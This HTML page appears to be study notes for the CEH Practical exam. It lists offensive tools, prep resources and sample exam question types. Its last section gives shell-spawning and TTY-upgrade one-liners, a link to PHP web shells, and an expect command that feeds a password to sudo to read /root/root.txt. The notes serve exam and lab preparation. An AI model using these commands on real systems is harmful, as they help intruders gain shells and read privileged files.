+https://youtube.com/playlist?list=PLQutQhatpiPdi3acYayu9mSnKXDuLMuD1&amp;si=6ubLuxsCtjIkUYfR</code></pre></details></li></ul><h1 id="18ab2af3-f9ef-8045-9ad2-d02b525466fe" class="">Tools used and Resources </h1><ul id="18ab2af3-f9ef-8043-bdd5-cb6f622355da" class="toggle"><li><details open=""><summary><strong>Tools used</strong></summary><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18ab2af3-f9ef-80fe-8f0b-eb57d94778ed" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Nmap/zenmap
+Metasploit
+Searchsploit
+Hydra
+Aircrack-ng
+Veracrypt
+Theef RAT
+BCTextEncoder
+StegHide
+Adb
+John the ripper
+Wireshark
+Phonesploit
+Sqlmap
+ZAP
+Open Stego
+Detect It Easy (DIE)
+Openvas
+Smbclient
+SSH
+
+Answer Format: AAaaNN**
+AA: Capital Alphabet
+aa: Small Alphabet
+NN: Numbers
+**: Special Symbols
+
+NOTE: All the required wordlists like passwords, and usernames are provided on systems, also keep a count of attempts while answering the questions.</code></pre></details></li></ul><ul id="18ab2af3-f9ef-804d-89b9-dfcf94de5b28" class="toggle"><li><details open=""><summary><strong>Resources</strong></summary><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18ab2af3-f9ef-8038-ba88-f209402102c8" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">https://github.com/CyberSecurityUP/Guide-CEH-Practical-Master
+https://github.com/DarkLycn1976/CEH-Practical-Notes-and-Tools
+https://github.com/hunterxxx/CEH-v12-Practical
+https://github.com/sampritdas8/Ec-Council-CEH-Practical--Guide-For-Exam/blob/main/CEH(Practical).md
+https://www.stationx.net/certified-ethical-hacker-ceh-exam-cheat-sheet/
+https://book.thegurusec.com/certifications/certified-ethical-hacker-practical
+https://tryhackme.com/
+https://www.hackthebox.com/</code></pre></details></li></ul><ul id="18ab2af3-f9ef-8000-85da-d7531faa6335" class="toggle"><li><details open=""><summary><strong>Extra Resources</strong></summary><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18ab2af3-f9ef-8023-8d95-d6a7e444bc79" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">User enumeration
+Steganography, steganalysis attacks, and how to cover your digital tracks
+Identifying viruses, computer worms, and malware 
+Packet sniffing, ideally Wireshark or Tcpdump
+SQL injection attacks
+Cryptography attacks
+Vulnerability analysis
+Nmap
+Hydra
+Metasploit
+Burpsuite
+Nikto or Nessus
+Dirbuster/gobuster
+Aircrack-ng
+Wpscan
+Hashcat
+Steghide
+IDA
+Vercrypt</code></pre></details></li></ul><ul id="18ab2af3-f9ef-8019-9e29-cdf9e6eb5844" class="toggle"><li><details open=""><summary><strong>Sample Questions</strong></summary><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18ab2af3-f9ef-8017-b318-d80cabb64cac" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">1. Find the service version of XYZ?
+2. Find the number of XYZ services?
+3. Crack the credentials of XYZ and answer?
+4. Access the Android device and find the hidden?
+5. Perform vulnerability scanning?
+6. Exploit remote login?
+7. Crack and find the credentials?
+8. Exploit weak credentials of XYZ services?
+9. Privilege Escalation?
+10. Use RAT to access hidden data?
+11. Malware Analysis?
+12. DDoS Attack Investigation?
+13. SQL Injection?
+14. Exploit Web Application?
+15. Traffic Analysis?
+16. Steganography And Cryptography And Wifi Cracking ?</code></pre></details></li></ul><ul id="190b2af3-f9ef-8099-989c-fe3e00b6268f" class="toggle"><li><details open=""><summary>Errors and Extra commands</summary><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="190b2af3-f9ef-809e-a2e2-d8ba5c28f199" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">VENV ERROR FIX:
+python3 -m venv .venv
+source .venv/bin/activate
+python3 -m pip install -r requirements.txt
+
+PHP SHELLS:
+https://w0rms.com/
+SPAWN SHELLS:
+/bin/sh -i
+echo os.system(&#x27;/bin/bash&#x27;)
+python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;
+python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;
+script -qc /bin/bash /dev/null
+perl -e &#x27;exec &quot;/bin/sh&quot;;&#x27;
+perl: exec &quot;/bin/sh&quot;;
+ruby: exec &quot;/bin/sh&quot;
+lua: os.execute(&#x27;/bin/sh&#x27;)
+IRB: exec &quot;/bin/sh&quot;
+vi: :!bash
+vi: :set shell=/bin/bash:shell
+nmap: !sh
+export TERM=XTERM
+NO TTY: If for some reason you cannot obtain a full TTY you still can interact with programs that expects user input.
+In the following example, the password is passed to sudo to read a file
+expect -c &#x27;spawn sudo -S cat &quot;/root/root.txt&quot;;expect &quot;*password*&quot;;send &quot;&lt;THE_PASSWORD_OF_THE_USER&gt;&quot;;send &quot;\r\n&quot;;interact&#x27;</code></pre></details></li></ul><p id="190b2af3-f9ef-806b-80ae-dc241091a3c9" class="">
+</p></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
